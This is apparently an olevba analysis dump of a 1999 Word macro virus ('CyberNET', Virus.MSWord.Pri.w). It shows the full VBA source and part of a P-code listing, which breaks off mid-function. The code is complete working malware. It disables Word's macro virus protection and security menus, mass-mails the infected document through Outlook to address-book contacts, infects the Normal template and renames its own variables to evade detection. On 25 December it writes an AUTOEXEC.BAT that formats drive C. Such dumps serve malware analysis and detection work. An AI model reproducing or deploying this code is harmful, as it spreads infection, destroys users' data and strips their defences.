olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.w
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.w - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1): Application.DisplayRecentFiles = (1 - 1)
End If
Call DB9310
If Day(Now) = 25 And Month(Now) = 12 Then
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@echo off"
Print #1, "@echo Vine...Vide...Vice...Moslem Power Never End..."
Print #1, "@echo Your Computer Have Just Been Terminated By -= CyberNET =- Virus !!!"
Print #1, "ctty nul"
Print #1, "format c: /autotest /q /u"
Close #1
MsgBox "Vine...Vide...Vice...Moslem Power Never End..." & Chr(13) & "You Dare Rise Against Me...The Human Era is Over, The CyberNET Era Has Come !!!", vbCritical + vbOKOnly, "(C)1999 - CyberNET"
Randomize: For ER2447 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next ER2447: End If
AF7690 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
EA6792 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set DD6156 = ActiveDocument.VBProject.VBComponents
Call AI5757(DD6156)
CN9685 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set DD6156 = NormalTemplate.VBProject.VBComponents
Call AI5757(DD6156)
IT7447 = True
Randomize
Dim r1(1 To 29) As String
r1(1) = "LA3150": r1(2) = "HN6720": r1(3) = "DM6113": r1(4) = "IC5974": r1(5) = "EA2976": r1(6) = "AF7690": r1(7) = "EA6792": r1(8) = "CN9685": r1(9) = "DD6156": r1(10) = "IT7447"
r1(11) = "VG9659": r1(12) = "LF9082": r1(13) = "TD1040": r1(14) = "UV270": r1(15) = "AR4228": r1(16) = "DB9310": r1(17) = "VB843": r1(18) = "JI2468": r1(19) = "EC2837": r1(20) = "VM8136"
r1(21) = "JA1847": r1(22) = "RD2972": r1(23) = "KB9847": r1(24) = "AI5757": r1(25) = "IL6896": r1(26) = "HK3239": r1(27) = "ER2447": r1(28) = "OI4890": r1(29) = "FF180"
For AR4228 = 1 To 29
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call EA2976(a1, r1(AR4228))
Next AR4228
ActiveDocument.Saved = True
End If
If IT7447 <> True And CN9685 <> True Then GoTo VG9659
If IT7447 = True Then DD6156.Item(1).CodeModule.AddFromstring ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AF7690 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "ViewVBCode" & vbCr & "End Sub")
If CN9685 = True Then DD6156.Item(1).CodeModule.AddFromstring ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, EA6792 - 8))
VG9659:
If EA6792 <> 0 And AF7690 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function EA2976(UV270, TD1040 As String)
On Error Resume Next
Dim LA3150 As Long: Dim HN6720 As Long: Dim DM6113 As Long: Dim IC5974 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
LA3150 = 1: HN6720 = 1: DM6113 = .CountOfLines: IC5974 = Len(.Lines(.CountOfLines, 1))
Do While .Find(TD1040, LA3150, HN6720, DM6113, IC5974, True)
strline = .Lines(LA3150, 1)
strline = Left(strline, HN6720 - 1) & UV270 & Mid(strline, IC5974)
.ReplaceLine LA3150, strline
LA3150 = DM6113 + 1: HN6720 = 1
DM6113 = .CountOfLines
IC5974 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function DB9310()
On Error Resume Next
Dim EC2837, VM8136, JA1847
Set EC2837 = CreateObject("Outlook.Application")
Set VM8136 = EC2837.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") <> "(C)1999 - Indonesia by AnomOke!" Then
If EC2837 = "Outlook" Then
VM8136.Logon "profile", "password"
For VB843 = 1 To VM8136.AddressLists.Count
Set FF180 = VM8136.AddressLists(VB843)
HK3239 = 1
Set JA1847 = EC2837.CreateItem(0)
For JI2468 = 1 To FF180.AddressEntries.Count
OI4890 = FF180.AddressEntries(HK3239)
JA1847.Recipients.Add OI4890
HK3239 = _
HK3239 + 1
If HK3239 > 50 Then JI2468 = FF180.AddressEntries.Count
Next JI2468
JA1847.Subject = "Message From " & Application.UserName
JA1847.Body = "This document is very Important and you've GOT to read this !!!"
JA1847.Attachments.Add ActiveDocument.FullName
JA1847.Send
OI4890 = ""
Next VB843
VM8136.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") = "(C)1999 - Indonesia by AnomOke!"
End If
End Function
Private Function AI5757(DD6156)
Dim IL6896 As Object
For Each IL6896 In DD6156
IL6896.CodeModule.DeleteLines 1, _
IL6896.CodeModule.CountOfLines
Next IL6896
End Function
Private Function FileOpen()
On Error Resume Next
WordBasic.disableautomacros True
Dialogs(80).Show
Document_Close
End Function
































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Pri.w
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10831 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #4:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set prevDocument 
' Line #5:
' 	SetStmt 
' 	Ld newDocument 
' 	Set nextDocument 
' Line #6:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	ArgsCall (Call) DB9310 0x0000 
' Line #9:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #10:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Paren 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #11:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "@echo Vine...Vide...Vice...Moslem Power Never End..."
' 	PrintItemNL 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0049 "@echo Your Computer Have Just Been Terminated By -= CyberNET =- Virus !!!"
' 	PrintItemNL 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "ctty nul"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "format c: /autotest /q /u"
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #17:
' 	LitStr 0x002E "Vine...Vide...Vice...Moslem Power Never End..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x004F "You Dare Rise Against Me...The Human Era is Over, The CyberNET Era Has Come !!!"
' 	Concat 
' 	Ld vbCritical 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0012 "(C)1999 - CyberNET"
' 	ArgsCall MsgBox 0x0003 
' Line #18:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld ER2447 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0046 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	For 
' Line #19:
' 	Ld Rnd 
' 	LitDI2 0x0078 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #20:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #21:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #22:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld ER2447 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St AF7690 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St EA6792 
' Line #25:
' 	LitDI2 0x0009 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0004 "Call"
' 	Ne 
' 	IfBlock 
' Line #26:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set DD6156 
' Line #27:
' 	Ld DD6156 
' 	ArgsCall (Call) AI5757 0x0001 
' Line #28:
' 	LitVarSpecial (True)
' 	St CN9685 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	LitDI2 0x0009 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0004 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0004 "Call"
' 	Ne 
' 	IfBlock 
' Line #31:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set DD6156 
' Line #32:
' 	Ld DD6156 
' 	ArgsCall (Call) AI5757 0x0001 
' Line #33:
' 	LitVarSpecial (True)
' 	St IT7447 
' Line #34:
' 	ArgsCall Read 0x0000 
' Line #35:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x001D 
' 	VarDefn r1 (As String)
' Line #36:
' 	LitStr 0x0006 "LA3150"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "HN6720"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "DM6113"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "IC5974"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "EA2976"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "AF7690"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "EA6792"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "CN9685"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "DD6156"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "IT7447"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' Line #37:
' 	LitStr 0x0006 "VG9659"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "LF9082"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "TD1040"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "UV270"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "AR4228"
' 	LitDI2 0x000F 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "DB9310"
' 	LitDI2 0x0010 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "VB843"
' 	LitDI2 0x0011 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "JI2468"
' 	LitDI2 0x0012 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "EC2837"
' 	LitDI2 0x0013 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "VM8136"
' 	LitDI2 0x0014 
' 	ArgsSt r1 0x0001 
' Line #38:
' 	LitStr 0x0006 "JA1847"
' 	LitDI2 0x0015 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "RD2972"
' 	LitDI2 0x0016 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "KB9847"
' 	LitDI2 0x0017 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "AI5757"
' 	LitDI2 0x0018 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "IL6896"
' 	LitDI2 0x0019 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "HK3239"
' 	LitDI2 0x001A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "ER2447"
' 	LitDI2 0x001B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "OI4890"
' 	LitDI2 0x001C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "FF180"
' 	LitDI2 0x001D 
' 	ArgsSt r1 0x0001 
' Line #39:
' 	StartForVariable 
' 	Ld AR4228 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001D 
' 	For 
' Line #40:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #41:
' 	Ld a1 
' 	Ld AR4228 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) EA2976 0x0002 
' Line #42:
' 	StartForVariable 
' 	Ld AR4228 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld IT7447 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld CN9685 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo VG9659 
' 	EndIf 
' Line #46:
' 	LineCont 0x0004 2A 00 00 00
' 	Ld IT7447 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld AF7690 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000C "CommandBars("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Tools"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B ").Controls("
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "Macro"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 ").Enabled = False"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000A "ViewVBCode"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld DD6156 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' 	EndIf 
' Line #47:
' 	Ld CN9685 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld EA6792 
' 	LitDI2 0x0008 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld DD6156 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' 	EndIf 
' Line #48:
' 	Label VG9659 
' Line #49:
' 	Ld EA6792 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld AF7690 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #50:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #52:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Private Function EA2976(UV270, TD1040 As String, id_FFFE As Variant))
' Line #55:
' 	OnError (Resume Next) 
' Line #56:
' 	Dim 
' 	VarDefn LA3150 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn HN6720 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn DM6113 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn IC5974 (As Long)
' Line #57:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #58:
' 	LitDI2 0x0001 
' 	St LA3150 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St HN6720 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St DM6113 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St IC5974 
' Line #59:
' 	Ld TD1040 
' 	Ld LA3150 
' 	Ld HN6720 
' 	Ld DM6113 
' 	Ld IC5974 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #60:
' 	Ld LA3150 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #61:
' 	Ld strline 
' 	Ld HN6720 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld UV270 
' 	Concat 
' 	Ld strline 
' 	Ld IC5974 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #62:
' 	Ld LA3150 
' 	Ld strline 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #63:
' 	Ld DM6113 
' 	LitDI2 0x0001 
' 	Add 
' 	St LA3150 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St HN6720 
' Line #64:
' 	MemLdWith CountOfLines 
' 	St DM6113 
' Line #65:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St IC5974 
' Line #66:
' 	Loop 
' Line #67:
' 	EndWith 
' Line #68:
' 	EndFunc 
' Line #69:
' 	FuncDefn (Private Function DB9310(id_FFFE As Variant))
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	Dim 
' 	VarDefn EC2837
' 	VarDefn VM8136
' 	VarDefn JA1847
' Line #72:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set EC2837 
' Line #73:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld EC2837 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set VM8136 
' Line #74:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "CyberNET"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x001F "(C)1999 - Indonesia by AnomOke!"
' 	Ne 
' 	IfBlock 
' Line #75:
' 	Ld EC2837 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #76:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld VM8136 
' 	ArgsMemCall Logon 0x0002 
' Line #77:
' 	StartForVariable 
' 	Ld VB843 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VM8136 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #78:
' 	SetStmt 
' 	Ld VB843 
' 	Ld VM8136 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set FF180 
' Line #79:
' 	LitDI2 0x0001 
' 	St HK3239 
' Line #80:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld EC2837 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set JA1847 
' Line #81:
' 	StartForVariable 
' 	Ld JI2468 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FF180 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #82:
' 	Ld HK3239 
' 	Ld FF180 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St OI4890 
' Line #83:
' 	Ld OI4890 
' 	Ld JA1847 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #84:
' 	LineCont 0x0004 02 00 00 00
' 	Ld HK3239 
' 	LitDI2 0x0001 
' 	Add 
' 	St HK3239 
' Line #85:
' 	Ld HK3239 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld FF180 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St JI2468 
' 	EndIf 
' Line #86:
' 	StartForVariable 
' 	Ld JI2468 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	LitStr 0x000D "Message From "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld JA1847 
' 	MemSt Subject 
' Line #88:
' 	LitStr 0x003F "This document is very Important and you've GOT to read this !!!"
' 	Ld JA1847 
' 	MemSt Body 
' Line #89:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld JA1847 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #90:
' 	Ld JA1847 
' 	ArgsMemCall Send 0x0000 
' Line #91:
' 	LitStr 0x0000 ""
' 	St OI4890 
' Line #92:
' 	StartForVariable 
' 	Ld VB843 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	Ld VM8136 
' 	ArgsMemCall Logoff 0x0000 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	LitStr 0x001F "(C)1999 - Indonesia by AnomOke!"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "CyberNET"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	EndFunc 
' Line #98:
' 	FuncDefn (Private Function AI5757(DD6156, id_FFFE As Variant))
' Line #99:
' 	Dim 
' 	VarDefn IL6896 (As Object)
' Line #100:
' 	StartForVariable 
' 	Ld IL6896 
' 	EndForVariable 
' 	Ld DD6156 
' 	ForEach 
' Line #101:
' 	LineCont 0x0004 07 00 00 00
' 	LitDI2 0x0001 
' 	Ld IL6896 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld IL6896 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #102:
' 	StartForVariable 
